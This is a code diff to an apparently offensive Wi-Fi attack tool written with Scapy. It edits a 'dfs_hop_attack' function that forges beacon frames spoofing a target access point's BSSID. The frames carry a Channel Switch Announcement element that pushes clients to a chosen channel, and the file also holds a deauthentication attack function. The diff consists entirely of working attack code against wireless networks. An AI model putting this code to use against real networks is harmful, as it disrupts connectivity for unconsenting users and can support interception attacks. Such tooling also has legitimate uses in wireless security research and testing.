@@ -76,9 +76,9 @@ def eapol_attack_deauth(interface: MonitorInterface, ap: AP, sta: Station, spam:
     sniff(iface=interface.name, prn=ap_deauth(interface, ap, sta))
 
 
-def dfs_hop_attack(interface: MonitorInterface, ap: AP, essid):
+def dfs_hop_attack(interface: MonitorInterface, ap: AP, essid: str, channel: int):
     pkt = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=ap.bssid, addr3=ap.bssid) / \
-          Dot11Beacon(cap=0x1104) / Dot11Elt(ID='SSID', info=essid, len=len(essid)) / \
+          Dot11Beacon(cap=0x9104) / Dot11Elt(ID='SSID', info="WAT", len=len("WAT")) / \
           Dot11Elt(ID='RSNinfo', info=(
               '\x01\x00'  # RSN Version 1
               '\x00\x0f\xac\x04'  # Group Cipher Suite : 00-0f-ac CCMP
@@ -87,18 +87,8 @@ def dfs_hop_attack(interface: MonitorInterface, ap: AP, essid):
               '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
               '\x00\x0f\xac\x02'  # Pre-Shared Key
               '\xcc\x00'  # Supports and requires MFP
-          )) / Dot11EltCSAM()
+          )) / Dot11Elt(ID=37, len=3, info=('\x00' + bytes([channel]) + '\x09\x01'))
     interface.inject(pkt)
-
-
-class Dot11EltCSAM(Packet):
-    name = "Channel Switch Announcement"
-
-    fields_desc = [
-        ByteField("Mode", 0),
-        ByteField("Number", 128),
-        ByteField("Count", 20)
-    ]
 
 
 class Dot11EltRates(Packet):
